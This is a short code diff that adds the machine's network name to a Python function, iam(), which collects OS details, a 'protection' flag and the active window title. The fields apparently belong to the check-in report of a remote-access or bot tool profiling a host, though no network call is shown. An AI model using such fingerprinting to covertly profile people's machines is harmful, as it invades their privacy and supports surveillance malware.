@@ -91,6 +91,7 @@ def iam():
     data['ostype'] = str(sys.platform)
     data['os'] = str(platform.platform())
     data['protection'] = str(unlocked)
+    data['user'] = str(platform.node())
     data['activewindowtitle'] = GetWindowTitle()
     return str(data)
 
